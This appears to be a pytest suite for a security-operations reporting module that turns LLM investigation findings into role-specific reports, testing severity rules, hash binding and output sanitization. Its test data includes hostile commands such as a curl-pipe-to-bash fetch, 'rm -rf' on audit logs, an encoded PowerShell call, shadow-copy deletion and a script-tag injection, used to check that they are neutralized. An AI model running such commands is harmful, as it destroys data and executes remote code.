"""
Unit tests for AISOP P2-H6: Role-Tailored Structured Investigation Reporting.

Tests:
1. All three report views generation (Executive, Technical IR, Detection Eng).
2. Epistemic claim partitioning and provenance preservation.
3. Incident severity calculation and insufficient evidence handling.
4. Cryptographic context binding and hash/ID mismatch rejection.
5. Detached-mode formatting disclosures and claim-derived observable labeling.
6. Truncated context and anti-benign disclosure enforcement.
7. Markdown injection, table cell escaping, and HTML neutralizing.
8. Dangerous command sanitization in recommended actions.
9. Byte-level determinism across repeated executions.
10. Zero secondary LLM calls guarantee.
"""

from __future__ import annotations

from datetime import datetime, timezone
import hashlib
import uuid

import pytest

from app.modules.ai.context_builder import compute_context_sha256
from app.modules.ai.guardrails.validator import (
    GuardrailDecision,
    InvestigationValidationResult,
)
from app.modules.ai.reporting.synthesizer import (
    ContextIntegrityError,
    DeterministicReportSynthesizer,
    verify_context_binding,
)
from app.schemas.investigation import (
    BudgetMetrics,
    ClaimCategory,
    ContextEventItem,
    ContextTIThreatState,
    ContextTIVerdict,
    FactualClaimItem,
    GroundingStatus,
    InvestigationContext,
    InvestigationScopeType,
    MitreAttackHypothesis,
    ReproducibilityRecord,
    StructuredInvestigationOutput,
)
from app.schemas.report import (
    IncidentSeverityTier,
    InvestigationReportBundle,
)


def _make_sample_context(
    inv_id: uuid.UUID,
    event_uuid: uuid.UUID,
    is_truncated: bool = False,
) -> InvestigationContext:
    t_start = datetime(2026, 10, 23, 10, 0, 0, tzinfo=timezone.utc)
    t_end = datetime(2026, 10, 23, 11, 0, 0, tzinfo=timezone.utc)
    ev = ContextEventItem(
        event_uuid=event_uuid,
        raw_evidence_sha256="a" * 64,
        event_id="1",
        event_type="process_creation",
        timestamp_utc=t_start,
        action="start",
        outcome="success",
        severity="medium",
        source_identifier="WORKSTATION-01",
        summary="powershell.exe started with encoded command",
        attributes={"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -NoP"},
    )
    total_ev = 2 if is_truncated else 1
    omitted = 1 if is_truncated else 0
    budget = BudgetMetrics(
        total_events_in_scope=total_ev,
        events_included=1,
        events_omitted_count=omitted,
        omitted_event_ids_summary=[uuid.uuid4()] if is_truncated else [],
        total_entities_in_scope=0,
        entities_included=0,
        knowledge_chunks_included=0,
        estimated_character_count=100,
        estimated_tokens=30,
        context_truncated=is_truncated,
    )
    repro = ReproducibilityRecord(
        request_id=uuid.uuid4(),
        time_window_start=t_start,
        time_window_end=t_end,
        selected_event_uuids=[event_uuid],
        selected_chunk_ids=[],
        context_sha256="0" * 64,
        prompt_template_version="1.0.0",
        llm_provider="ollama",
        model_name="llama3.1:8b",
        created_at_utc=datetime.now(timezone.utc),
    )
    ctx = InvestigationContext(
        schema_version="1.0.0",
        investigation_id=inv_id,
        scope_type=InvestigationScopeType.SINGLE_EVENT,
        time_window_start=t_start,
        time_window_end=t_end,
        target_hosts=["WORKSTATION-01"],
        events=[ev],
        entities=[],
        threat_intel=[],
        knowledge_chunks=[],
        budget_metrics=budget,
        reproducibility=repro,
        uncertainty_flags=["CONTEXT_TRUNCATED: Budget exceeded"] if is_truncated else [],
        assembled_at=datetime.now(timezone.utc),
    )
    digest = compute_context_sha256(ctx)
    repro_updated = repro.model_copy(update={"context_sha256": digest})
    return ctx.model_copy(update={"reproducibility": repro_updated})


def _make_sample_validation_result(
    inv_id: uuid.UUID,
    event_uuid: uuid.UUID,
    context_sha256: str,
    decision: GuardrailDecision = GuardrailDecision.PASS,
    is_valid: bool = True,
    grounding_score: float | None = None,
    claims: list[FactualClaimItem] | None = None,
    actions: list[str] | None = None,
    hypotheses: list[MitreAttackHypothesis] | None = None,
    uncertainty_gaps: list[str] | None = None,
) -> InvestigationValidationResult:
    if claims is None:
        claims = [
            FactualClaimItem(
                claim_id=uuid.uuid4(),
                claim_text="powershell.exe executed with suspicious command line on WORKSTATION-01",
                category=ClaimCategory.OBSERVED_FACT,
                supporting_evidence_ids=[event_uuid],
                references_exist=True,
                grounding_status=GroundingStatus.VALIDATED_REFERENCE,
                confidence=0.95,
                analyst_notes=None,
            )
        ]
    if hypotheses is None:
        hypotheses = [
            MitreAttackHypothesis(
                technique_id="T1059.001",
                technique_name="PowerShell",
                tactics=["Execution"],
                supporting_event_uuids=[event_uuid],
                confidence=0.90,
                reasoning="Telemetry shows execution of powershell.exe",
            )
        ]
    if actions is None:
        actions = ["Review host event logs and isolate network interface if unauthorized."]

    if grounding_score is None:
        if claims:
            val_count = sum(1 for c in claims if c.grounding_status == GroundingStatus.VALIDATED_REFERENCE)
            grounding_score = val_count / len(claims)
        else:
            grounding_score = 0.0

    val_time = datetime(2026, 10, 23, 11, 5, 0, tzinfo=timezone.utc)
    output = StructuredInvestigationOutput(
        investigation_id=inv_id,
        generated_at=val_time,
        model_identifier="ollama/llama3.1:8b",
        investigation_summary="Suspicious PowerShell activity was detected on WORKSTATION-01.",
        claims=claims,
        mitre_attack_hypotheses=hypotheses,
        alternative_explanations=["Scheduled administrative maintenance task"],
        recommended_analyst_actions=actions,
        uncertainty_and_data_gaps=uncertainty_gaps or [],
        overall_grounding_score=grounding_score,
    )
    return InvestigationValidationResult(
        decision=decision,
        is_valid=is_valid,
        output=output,
        violations=[],
        context_sha256=context_sha256,
        validated_at_utc=val_time,
    )


# ── TEST CASES ───────────────────────────────────────────────────────────────

def test_all_three_report_views_generation():
    """Synthesizer produces complete Executive, Technical, and Detection views."""
    inv_id = uuid.uuid4()
    ev_uuid = uuid.uuid4()
    ctx = _make_sample_context(inv_id, ev_uuid)
    val_res = _make_sample_validation_result(inv_id, ev_uuid, ctx.reproducibility.context_sha256)

    synthesizer = DeterministicReportSynthesizer()
    bundle = synthesizer.synthesize_bundle(val_res, ctx)

    assert isinstance(bundle, InvestigationReportBundle)
    assert bundle.investigation_id == inv_id
    assert bundle.context_sha256 == ctx.reproducibility.context_sha256
    assert not bundle.is_fallback_active

    # Executive Brief assertions
    assert bundle.executive_brief.title == "AISOP Executive Security Brief"
    assert "WORKSTATION-01" in bundle.executive_brief.evidenced_affected_assets
    assert len(bundle.executive_brief.key_confirmed_findings) == 1
    assert "powershell.exe" in bundle.executive_brief.key_confirmed_findings[0]
    assert bundle.executive_brief.incident_severity == IncidentSeverityTier.HIGH

    # Technical Report assertions
    assert len(bundle.technical_report.investigation_timeline) == 1
    assert bundle.technical_report.investigation_timeline[0].event_uuid == ev_uuid
    assert len(bundle.technical_report.confirmed_findings) == 1
    assert len(bundle.technical_report.mitre_attack_mappings) == 1
    assert bundle.technical_report.mitre_attack_mappings[0]["technique_id"] == "T1059.001"

    # Detection Report assertions
    assert "T1059.001" in bundle.detection_report.mitre_coverage_targets
    assert len(bundle.detection_report.candidate_detection_hypotheses) >= 1
    assert len(bundle.detection_report.candidate_hunting_pseudocode) >= 1

    # Markdown assertions
    assert "# AISOP Executive Security Brief" in bundle.markdown_executive
    assert "# AISOP Technical Incident Response Report" in bundle.markdown_technical
    assert "# AISOP Detection Engineering & Hunting Report" in bundle.markdown_detection
    assert bundle.markdown_executive.endswith("\n")
    assert bundle.markdown_technical.endswith("\n")
    assert bundle.markdown_detection.endswith("\n")


def test_epistemic_partitioning_isolation():
    """Confirmed findings, inferences, and refuted claims are strictly partitioned."""
    inv_id = uuid.uuid4()
    ev_uuid = uuid.uuid4()
    ctx = _make_sample_context(inv_id, ev_uuid)

    c1 = FactualClaimItem(
        claim_id=uuid.uuid4(),
        claim_text="Confirmed fact: process created",
        category=ClaimCategory.OBSERVED_FACT,
        supporting_evidence_ids=[ev_uuid],
        references_exist=True,
        grounding_status=GroundingStatus.VALIDATED_REFERENCE,
        confidence=0.99,
        analyst_notes=None,
    )
    c2 = FactualClaimItem(
        claim_id=uuid.uuid4(),
        claim_text="Inference: probable initial access attempt",
        category=ClaimCategory.INFERENCE,
        supporting_evidence_ids=[ev_uuid],
        references_exist=True,
        grounding_status=GroundingStatus.ANALYST_REVIEW_REQUIRED,
        confidence=0.65,
        analyst_notes="Review required",
    )
    c3 = FactualClaimItem(
        claim_id=uuid.uuid4(),
        claim_text="Unsupported: rootkit installed",
        category=ClaimCategory.OBSERVED_FACT,
        supporting_evidence_ids=[],
        references_exist=False,
        grounding_status=GroundingStatus.UNSUPPORTED,
        confidence=0.0,
        analyst_notes="Zero supporting evidence",
    )
    c4 = FactualClaimItem(
        claim_id=uuid.uuid4(),
        claim_text="Contradicted: login succeeded",
        category=ClaimCategory.OBSERVED_FACT,
        supporting_evidence_ids=[ev_uuid],
        references_exist=True,
        grounding_status=GroundingStatus.CONTRADICTED,
        confidence=0.0,
        analyst_notes="Refuted by event outcome",
    )

    val_res = _make_sample_validation_result(
        inv_id,
        ev_uuid,
        ctx.reproducibility.context_sha256,
        grounding_score=0.25,
        claims=[c1, c2, c3, c4],
    )

    synthesizer = DeterministicReportSynthesizer()
    bundle = synthesizer.synthesize_bundle(val_res, ctx)

    # Check Executive Brief key confirmed findings contains only c1
    assert len(bundle.executive_brief.key_confirmed_findings) == 1
    assert "Confirmed fact" in bundle.executive_brief.key_confirmed_findings[0]

    # Check Technical Report partitions
    assert len(bundle.technical_report.confirmed_findings) == 1
    assert bundle.technical_report.confirmed_findings[0].claim_text == "Confirmed fact: process created"

    assert len(bundle.technical_report.hypotheses_and_inferences) == 1
    assert "Inference" in bundle.technical_report.hypotheses_and_inferences[0].claim_text

    assert len(bundle.technical_report.unsupported_or_contradicted_claims) == 2
    statuses = {c.grounding_status for c in bundle.technical_report.unsupported_or_contradicted_claims}
    assert "unsupported" in statuses
    assert "contradicted" in statuses


def test_severity_safeguards_and_insufficient_evidence():
    """Severity returns INCONCLUSIVE when output failed grounding or fell back."""
    inv_id = uuid.uuid4()
    ev_uuid = uuid.uuid4()
    ctx = _make_sample_context(inv_id, ev_uuid)

    # 1. Fallback disposition
    val_res_fallback = _make_sample_validation_result(
        inv_id,
        ev_uuid,
        ctx.reproducibility.context_sha256,
        decision=GuardrailDecision.REJECT_TO_FALLBACK,
        is_valid=False,
        grounding_score=0.0,
        claims=[],
    )
    synthesizer = DeterministicReportSynthesizer()
    bundle_fb = synthesizer.synthesize_bundle(val_res_fallback, ctx)
    assert bundle_fb.is_fallback_active is True
    assert bundle_fb.executive_brief.incident_severity == IncidentSeverityTier.INCONCLUSIVE
    assert "Inconclusive" in bundle_fb.executive_brief.severity_justification
    assert "> [!CAUTION]" in bundle_fb.markdown_executive

    # 2. Critical severity for high-impact tactics
    hyp_critical = [
        MitreAttackHypothesis(
            technique_id="T1048",
            technique_name="Exfiltration Over Alternative Protocol",
            tactics=["Exfiltration"],
            supporting_event_uuids=[ev_uuid],
            confidence=0.85,
            reasoning="Data exfiltrated via external channel",
        )
    ]
    val_res_crit = _make_sample_validation_result(
        inv_id,
        ev_uuid,
        ctx.reproducibility.context_sha256,
        hypotheses=hyp_critical,
    )
    bundle_crit = synthesizer.synthesize_bundle(val_res_crit, ctx)
    assert bundle_crit.executive_brief.incident_severity == IncidentSeverityTier.CRITICAL


def test_cryptographic_context_binding_verification():
    """Context binding rejects hash and investigation-ID mismatches with ContextIntegrityError."""
    inv_id = uuid.uuid4()
    ev_uuid = uuid.uuid4()
    ctx = _make_sample_context(inv_id, ev_uuid)
    val_res = _make_sample_validation_result(inv_id, ev_uuid, ctx.reproducibility.context_sha256)

    # Valid binding passes
    verify_context_binding(val_res, ctx)

    # ID mismatch raises ContextIntegrityError
    other_ctx = _make_sample_context(uuid.uuid4(), ev_uuid)
    with pytest.raises(ContextIntegrityError, match="Investigation ID mismatch"):
        verify_context_binding(val_res, other_ctx)

    # Hash mismatch raises ContextIntegrityError
    tampered_val_res = val_res.model_copy(update={"context_sha256": "f" * 64})
    with pytest.raises(ContextIntegrityError, match="cryptographic digest mismatch"):
        verify_context_binding(tampered_val_res, ctx)


def test_detached_mode_formatting_and_disclosures():
    """Detached format mode handles absent context gracefully with explicit disclosures."""
    inv_id = uuid.uuid4()
    ev_uuid = uuid.uuid4()
    dummy_sha = "0" * 64
    val_res = _make_sample_validation_result(inv_id, ev_uuid, dummy_sha)

    synthesizer = DeterministicReportSynthesizer()
    bundle = synthesizer.synthesize_bundle(val_res, context=None)

    assert bundle.provenance.is_detached_format_mode is True
    assert bundle.technical_report.timeline_status_disclosure is not None
    assert "detached-format mode" in bundle.technical_report.timeline_status_disclosure
    assert "*Telemetry event timeline unavailable in detached-format mode" in bundle.markdown_technical

    # Observables are marked as claim_text_extraction
    for obs in bundle.detection_report.validated_observables:
        assert obs.provenance_type == "claim_text_extraction"
        assert len(obs.provenance_claim_ids) >= 1


def test_truncated_telemetry_anti_benign_enforcement():
    """Truncated context sets severity to INCONCLUSIVE and prevents benign conclusion."""
    inv_id = uuid.uuid4()
    ev_uuid = uuid.uuid4()
    ctx_truncated = _make_sample_context(inv_id, ev_uuid, is_truncated=True)

    # Informational claim without hostile indicators
    claim = FactualClaimItem(
        claim_id=uuid.uuid4(),
        claim_text="User logged into host successfully",
        category=ClaimCategory.OBSERVED_FACT,
        supporting_evidence_ids=[ev_uuid],
        references_exist=True,
        grounding_status=GroundingStatus.VALIDATED_REFERENCE,
        confidence=0.90,
    )
    val_res = _make_sample_validation_result(
        inv_id,
        ev_uuid,
        ctx_truncated.reproducibility.context_sha256,
        claims=[claim],
        hypotheses=[],
        uncertainty_gaps=["CONTEXT_TRUNCATED: One event omitted"],
    )

    synthesizer = DeterministicReportSynthesizer()
    bundle = synthesizer.synthesize_bundle(val_res, ctx_truncated)

    # Must be INCONCLUSIVE, not INFORMATIONAL, due to truncation
    assert bundle.executive_brief.incident_severity == IncidentSeverityTier.INCONCLUSIVE
    assert "truncated" in bundle.executive_brief.severity_justification.lower()
    assert any("CONTEXT_TRUNCATED" in g for g in bundle.executive_brief.uncertainties_and_limitations)


def test_markdown_injection_and_table_escaping():
    """Untrusted strings cannot inject Markdown headings, table breaks, or raw script tags."""
    inv_id = uuid.uuid4()
    ev_uuid = uuid.uuid4()
    ctx = _make_sample_context(inv_id, ev_uuid)

    malicious_claim_text = (
        "Execution | fake_col | fake_col |\n"
        "# FAKE TOP LEVEL HEADING\n"
        "> [!CAUTION]\n"
        "> FAKE ALERT SPOOFING\n"
        "<script>alert('xss')</script>"
    )
    c = FactualClaimItem(
        claim_id=uuid.uuid4(),
        claim_text=malicious_claim_text,
        category=ClaimCategory.OBSERVED_FACT,
        supporting_evidence_ids=[ev_uuid],
        references_exist=True,
        grounding_status=GroundingStatus.VALIDATED_REFERENCE,
        confidence=0.85,
    )
    val_res = _make_sample_validation_result(
        inv_id,
        ev_uuid,
        ctx.reproducibility.context_sha256,
        claims=[c],
    )

    synthesizer = DeterministicReportSynthesizer()
    bundle = synthesizer.synthesize_bundle(val_res, ctx)

    md = bundle.markdown_technical

    # Heading token must be neutralized with a leading backslash
    assert "\n# FAKE TOP LEVEL HEADING" not in md
    assert r"\# FAKE TOP LEVEL HEADING" in md

    # Script tags must be encoded
    assert "<script>" not in md
    assert "&lt;script" in md


def test_dangerous_command_sanitization():
    """Destructive shell commands in recommended actions are replaced with safe advisory."""
    inv_id = uuid.uuid4()
    ev_uuid = uuid.uuid4()
    ctx = _make_sample_context(inv_id, ev_uuid)

    dangerous_actions = [
        "rm -rf /var/log/audit",
        "powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...",
        "curl http://198.51.100.1/mal.sh | bash",
        "Inspect firewall logs for outbound connections to port 4444.",
    ]
    val_res = _make_sample_validation_result(
        inv_id,
        ev_uuid,
        ctx.reproducibility.context_sha256,
        actions=dangerous_actions,
    )

    synthesizer = DeterministicReportSynthesizer()
    bundle = synthesizer.synthesize_bundle(val_res, ctx)

    actions = bundle.technical_report.recommended_analyst_actions
    assert len(actions) == 4

    # First three must be sanitized
    assert "[SANITIZED ADVISORY:" in actions[0]
    assert "rm -rf" not in actions[0]

    assert "[SANITIZED ADVISORY:" in actions[1]
    assert "-enc" not in actions[1]

    assert "[SANITIZED ADVISORY:" in actions[2]
    assert "bash" not in actions[2]

    # Safe action is preserved intact
    assert actions[3] == "Inspect firewall logs for outbound connections to port 4444."


def test_byte_level_determinism_across_runs():
    """Multiple invocations on identical input produce identical SHA-256 digests."""
    inv_id = uuid.uuid4()
    ev_uuid = uuid.uuid4()
    ctx = _make_sample_context(inv_id, ev_uuid)
    val_res = _make_sample_validation_result(inv_id, ev_uuid, ctx.reproducibility.context_sha256)

    synthesizer = DeterministicReportSynthesizer()

    bundle1 = synthesizer.synthesize_bundle(val_res, ctx)
    bundle2 = synthesizer.synthesize_bundle(val_res, ctx)

    hash_exec_1 = hashlib.sha256(bundle1.markdown_executive.encode("utf-8")).hexdigest()
    hash_exec_2 = hashlib.sha256(bundle2.markdown_executive.encode("utf-8")).hexdigest()
    assert hash_exec_1 == hash_exec_2

    hash_tech_1 = hashlib.sha256(bundle1.markdown_technical.encode("utf-8")).hexdigest()
    hash_tech_2 = hashlib.sha256(bundle2.markdown_technical.encode("utf-8")).hexdigest()
    assert hash_tech_1 == hash_tech_2

    hash_det_1 = hashlib.sha256(bundle1.markdown_detection.encode("utf-8")).hexdigest()
    hash_det_2 = hashlib.sha256(bundle2.markdown_detection.encode("utf-8")).hexdigest()
    assert hash_det_1 == hash_det_2


def test_zero_secondary_llm_calls_guarantee(monkeypatch):
    """Synthesizer executes purely in Python with zero LLM provider or external network calls."""
    from app.modules.ai.llm.protocol import LLMProvider

    def fail_generate(*args, **kwargs):
        pytest.fail("Secondary LLM call attempted during report synthesis! Invariant violated.")

    monkeypatch.setattr(LLMProvider, "generate", fail_generate, raising=False)

    inv_id = uuid.uuid4()
    ev_uuid = uuid.uuid4()
    ctx = _make_sample_context(inv_id, ev_uuid)
    val_res = _make_sample_validation_result(inv_id, ev_uuid, ctx.reproducibility.context_sha256)

    synthesizer = DeterministicReportSynthesizer()
    bundle = synthesizer.synthesize_bundle(val_res, ctx)
    assert bundle is not None
    assert bundle.investigation_id == inv_id


# ── SEC-AUDIT-001 REGRESSION TESTS: EVIDENCE-GROUNDED SEVERITY ───────────────

def test_sec_audit_001_exfiltration_hypothesis_without_supporting_events():
    """1. High-confidence Exfiltration hypothesis without verified supporting events does not elevate severity."""
    inv_id = uuid.uuid4()
    ev_uuid = uuid.uuid4()
    ctx = _make_sample_context(inv_id, ev_uuid)
    ctx_events = [
        ctx.events[0].model_copy(update={"action": "query", "outcome": "success", "severity": "informational"})
    ]
    ctx = ctx.model_copy(update={"events": ctx_events})

    hyp = MitreAttackHypothesis(
        technique_id="T1048",
        technique_name="Exfiltration Over Alternative Protocol",
        tactics=["Exfiltration"],
        supporting_event_uuids=[],
        confidence=0.95,
        reasoning="Model asserts exfiltration occurred without citing evidence",
    )
    val_res = _make_sample_validation_result(
        inv_id,
        ev_uuid,
        ctx.reproducibility.context_sha256,
        hypotheses=[hyp],
    )
    synthesizer = DeterministicReportSynthesizer()
    bundle = synthesizer.synthesize_bundle(val_res, ctx)
    assert bundle.executive_brief.incident_severity != IncidentSeverityTier.CRITICAL
    assert bundle.executive_brief.incident_severity != IncidentSeverityTier.HIGH


def test_sec_audit_001_hypothesis_citing_unknown_event_uuid():
    """2. Hypothesis citing an unknown/unverified event UUID cannot elevate severity."""
    inv_id = uuid.uuid4()
    ev_uuid = uuid.uuid4()
    ctx = _make_sample_context(inv_id, ev_uuid)
    unknown_uuid = uuid.uuid4()

    hyp = MitreAttackHypothesis(
        technique_id="T1048",
        technique_name="Exfiltration Over Alternative Protocol",
        tactics=["Exfiltration"],
        supporting_event_uuids=[unknown_uuid],
        confidence=0.90,
        reasoning="Data exfiltrated to external IP",
    )
    val_res = _make_sample_validation_result(
        inv_id,
        ev_uuid,
        ctx.reproducibility.context_sha256,
        hypotheses=[hyp],
    )
    synthesizer = DeterministicReportSynthesizer()
    bundle = synthesizer.synthesize_bundle(val_res, ctx)
    assert bundle.executive_brief.incident_severity != IncidentSeverityTier.CRITICAL
    assert bundle.executive_brief.incident_severity != IncidentSeverityTier.HIGH


def test_sec_audit_001_blocked_or_denied_action_reports_medium():
    """3. Blocked or denied adversary action warrants investigation but does not report as compromise."""
    inv_id = uuid.uuid4()
    ev_uuid = uuid.uuid4()
    ev_blocked = ContextEventItem(
        event_uuid=ev_uuid,
        raw_evidence_sha256="b" * 64,
        event_id="3",
        event_type="network_connection",
        timestamp_utc=datetime(2026, 10, 23, 10, 30, 0, tzinfo=timezone.utc),
        action="blocked",
        outcome="denied",
        severity="high",
        source_identifier="WORKSTATION-01",
        summary="Outbound connection to malicious C2 blocked by firewall",
        attributes={"DestinationIp": "198.51.100.2"},
    )
    ctx = _make_sample_context(inv_id, ev_uuid)
    ctx = ctx.model_copy(update={"events": [ev_blocked]})

    hyp = MitreAttackHypothesis(
        technique_id="T1048",
        technique_name="Exfiltration Over Alternative Protocol",
        tactics=["Exfiltration"],
        supporting_event_uuids=[ev_uuid],
        confidence=0.85,
        reasoning="Attempted exfiltration blocked by perimeter firewall",
    )
    val_res = _make_sample_validation_result(
        inv_id,
        ev_uuid,
        ctx.reproducibility.context_sha256,
        hypotheses=[hyp],
    )
    synthesizer = DeterministicReportSynthesizer()
    bundle = synthesizer.synthesize_bundle(val_res, ctx)
    assert bundle.executive_brief.incident_severity == IncidentSeverityTier.MEDIUM
    assert "blocked or denied" in bundle.executive_brief.severity_justification.lower()


def test_sec_audit_001_successful_action_with_valid_structured_evidence():
    """4. Successful hostile action supported by valid structured evidence elevates severity."""
    inv_id = uuid.uuid4()
    ev_uuid = uuid.uuid4()
    ev_success = ContextEventItem(
        event_uuid=ev_uuid,
        raw_evidence_sha256="c" * 64,
        event_id="1",
        event_type="process_creation",
        timestamp_utc=datetime(2026, 10, 23, 10, 30, 0, tzinfo=timezone.utc),
        action="start",
        outcome="success",
        severity="high",
        source_identifier="SERVER-01",
        summary="vssadmin.exe delete shadows executed successfully",
        attributes={"CommandLine": "vssadmin.exe delete shadows /all /quiet"},
    )
    ctx = _make_sample_context(inv_id, ev_uuid)
    ctx = ctx.model_copy(update={"events": [ev_success]})

    hyp = MitreAttackHypothesis(
        technique_id="T1490",
        technique_name="Inhibit System Recovery",
        tactics=["Impact"],
        supporting_event_uuids=[ev_uuid],
        confidence=0.85,
        reasoning="Shadow copies deleted to inhibit system recovery",
    )
    val_res = _make_sample_validation_result(
        inv_id,
        ev_uuid,
        ctx.reproducibility.context_sha256,
        hypotheses=[hyp],
    )
    synthesizer = DeterministicReportSynthesizer()
    bundle = synthesizer.synthesize_bundle(val_res, ctx)
    assert bundle.executive_brief.incident_severity == IncidentSeverityTier.CRITICAL
    assert "Critical" in bundle.executive_brief.severity_justification


def test_sec_audit_001_negated_claim_does_not_trigger_substring_critical():
    """5. A claim stating there is no evidence of exfiltration does not trigger critical severity."""
    inv_id = uuid.uuid4()
    ev_uuid = uuid.uuid4()
    ev_routine = ContextEventItem(
        event_uuid=ev_uuid,
        raw_evidence_sha256="d" * 64,
        event_id="1",
        event_type="process_creation",
        timestamp_utc=datetime(2026, 10, 23, 10, 0, 0, tzinfo=timezone.utc),
        action="start",
        outcome="success",
        severity="informational",
        source_identifier="WORKSTATION-01",
        summary="explorer.exe started by user",
        attributes={"CommandLine": "explorer.exe"},
    )
    ctx = _make_sample_context(inv_id, ev_uuid)
    ctx = ctx.model_copy(update={"events": [ev_routine]})

    negated_claim = FactualClaimItem(
        claim_id=uuid.uuid4(),
        claim_text="Forensic inspection confirms there is no evidence of exfiltration, data destruction, or ransomware.",
        category=ClaimCategory.OBSERVED_FACT,
        supporting_evidence_ids=[ev_uuid],
        references_exist=True,
        grounding_status=GroundingStatus.VALIDATED_REFERENCE,
        confidence=0.95,
    )
    val_res = _make_sample_validation_result(
        inv_id,
        ev_uuid,
        ctx.reproducibility.context_sha256,
        claims=[negated_claim],
        hypotheses=[],
    )
    synthesizer = DeterministicReportSynthesizer()
    bundle = synthesizer.synthesize_bundle(val_res, ctx)
    assert bundle.executive_brief.incident_severity != IncidentSeverityTier.CRITICAL
    assert bundle.executive_brief.incident_severity == IncidentSeverityTier.INFORMATIONAL


def test_sec_audit_001_unsupported_contradicted_claims_with_critical_keywords():
    """6. Unsupported or contradicted claims containing critical keywords do not elevate severity."""
    inv_id = uuid.uuid4()
    ev_uuid = uuid.uuid4()
    ev_routine = ContextEventItem(
        event_uuid=ev_uuid,
        raw_evidence_sha256="e" * 64,
        event_id="1",
        event_type="process_creation",
        timestamp_utc=datetime(2026, 10, 23, 10, 0, 0, tzinfo=timezone.utc),
        action="start",
        outcome="success",
        severity="informational",
        source_identifier="WORKSTATION-01",
        summary="notepad.exe started by user",
        attributes={"CommandLine": "notepad.exe"},
    )
    ctx = _make_sample_context(inv_id, ev_uuid)
    ctx = ctx.model_copy(update={"events": [ev_routine]})

    c_valid = FactualClaimItem(
        claim_id=uuid.uuid4(),
        claim_text="User opened notepad.exe for text editing",
        category=ClaimCategory.OBSERVED_FACT,
        supporting_evidence_ids=[ev_uuid],
        references_exist=True,
        grounding_status=GroundingStatus.VALIDATED_REFERENCE,
        confidence=0.90,
    )
    c_unsupported = FactualClaimItem(
        claim_id=uuid.uuid4(),
        claim_text="Adversary exfiltrated credentials and attempted to wipe all disks",
        category=ClaimCategory.OBSERVED_FACT,
        supporting_evidence_ids=[],
        references_exist=False,
        grounding_status=GroundingStatus.UNSUPPORTED,
        confidence=0.0,
    )
    c_contradicted = FactualClaimItem(
        claim_id=uuid.uuid4(),
        claim_text="Ransomware encrypt binary executed on domain controller",
        category=ClaimCategory.OBSERVED_FACT,
        supporting_evidence_ids=[ev_uuid],
        references_exist=True,
        grounding_status=GroundingStatus.CONTRADICTED,
        confidence=0.0,
    )
    val_res = _make_sample_validation_result(
        inv_id,
        ev_uuid,
        ctx.reproducibility.context_sha256,
        claims=[c_valid, c_unsupported, c_contradicted],
        hypotheses=[],
    )
    synthesizer = DeterministicReportSynthesizer()
    bundle = synthesizer.synthesize_bundle(val_res, ctx)
    assert bundle.executive_brief.incident_severity != IncidentSeverityTier.CRITICAL
    assert bundle.executive_brief.incident_severity == IncidentSeverityTier.INFORMATIONAL


def test_sec_audit_001_missing_or_unknown_outcome_fields_returns_inconclusive():
    """7. Telemetry with missing or unknown outcome fields returns INCONCLUSIVE rather than guessing."""
    inv_id = uuid.uuid4()
    ev_uuid = uuid.uuid4()
    ev_unknown = ContextEventItem(
        event_uuid=ev_uuid,
        raw_evidence_sha256="f" * 64,
        event_id="1",
        event_type="process_creation",
        timestamp_utc=datetime(2026, 10, 23, 10, 0, 0, tzinfo=timezone.utc),
        action="execute",
        outcome="unknown",
        severity="medium",
        source_identifier="WORKSTATION-01",
        summary="powershell.exe invoked with encoded command; completion unknown",
        attributes={"CommandLine": "powershell.exe -enc ..."},
    )
    ctx = _make_sample_context(inv_id, ev_uuid)
    ctx = ctx.model_copy(update={"events": [ev_unknown]})

    hyp = MitreAttackHypothesis(
        technique_id="T1059.001",
        technique_name="PowerShell",
        tactics=["Execution"],
        supporting_event_uuids=[ev_uuid],
        confidence=0.80,
        reasoning="PowerShell execution initiated but completion unrecorded",
    )
    val_res = _make_sample_validation_result(
        inv_id,
        ev_uuid,
        ctx.reproducibility.context_sha256,
        hypotheses=[hyp],
    )
    synthesizer = DeterministicReportSynthesizer()
    bundle = synthesizer.synthesize_bundle(val_res, ctx)
    assert bundle.executive_brief.incident_severity == IncidentSeverityTier.INCONCLUSIVE
    assert "unknown or unavailable" in bundle.executive_brief.severity_justification.lower()


def test_sec_audit_001_truncated_evidence_and_fallback_output_returns_inconclusive():
    """8. Truncated evidence and fallback output always resolve to INCONCLUSIVE."""
    inv_id = uuid.uuid4()
    ev_uuid = uuid.uuid4()
    ctx = _make_sample_context(inv_id, ev_uuid, is_truncated=True)

    val_res = _make_sample_validation_result(
        inv_id,
        ev_uuid,
        ctx.reproducibility.context_sha256,
        decision=GuardrailDecision.REJECT_TO_FALLBACK,
        is_valid=False,
        claims=[],
        grounding_score=0.0,
    )
    synthesizer = DeterministicReportSynthesizer()
    bundle = synthesizer.synthesize_bundle(val_res, ctx)
    assert bundle.executive_brief.incident_severity == IncidentSeverityTier.INCONCLUSIVE
    assert bundle.is_fallback_active is True


# ── SEC-AUDIT-002 REGRESSION TESTS: DETACHED REPORTS INCONCLUSIVE ────────────

def test_sec_audit_002_detached_report_no_claims():
    """Detached report with zero claims is INCONCLUSIVE with explicit disclosures."""
    inv_id = uuid.uuid4()
    val_res = _make_sample_validation_result(
        inv_id,
        uuid.uuid4(),
        "0" * 64,
        claims=[],
        hypotheses=[],
    )
    synthesizer = DeterministicReportSynthesizer()
    bundle = synthesizer.synthesize_bundle(val_res, context=None)
    assert bundle.executive_brief.incident_severity == IncidentSeverityTier.INCONCLUSIVE
    assert "detached" in bundle.executive_brief.severity_justification.lower()
    assert any("TELEMETRY_UNAVAILABLE" in g for g in bundle.executive_brief.uncertainties_and_limitations)


def test_sec_audit_002_detached_report_benign_looking_text():
    """Detached report with benign claim text remains INCONCLUSIVE (never INFORMATIONAL)."""
    inv_id = uuid.uuid4()
    dummy_ev = uuid.uuid4()
    claim = FactualClaimItem(
        claim_id=uuid.uuid4(),
        claim_text="Routine administrative maintenance script ran successfully",
        category=ClaimCategory.OBSERVED_FACT,
        supporting_evidence_ids=[dummy_ev],
        references_exist=True,
        grounding_status=GroundingStatus.VALIDATED_REFERENCE,
        confidence=0.90,
    )
    val_res = _make_sample_validation_result(
        inv_id,
        dummy_ev,
        "0" * 64,
        claims=[claim],
        hypotheses=[],
    )
    synthesizer = DeterministicReportSynthesizer()
    bundle = synthesizer.synthesize_bundle(val_res, context=None)
    assert bundle.executive_brief.incident_severity == IncidentSeverityTier.INCONCLUSIVE
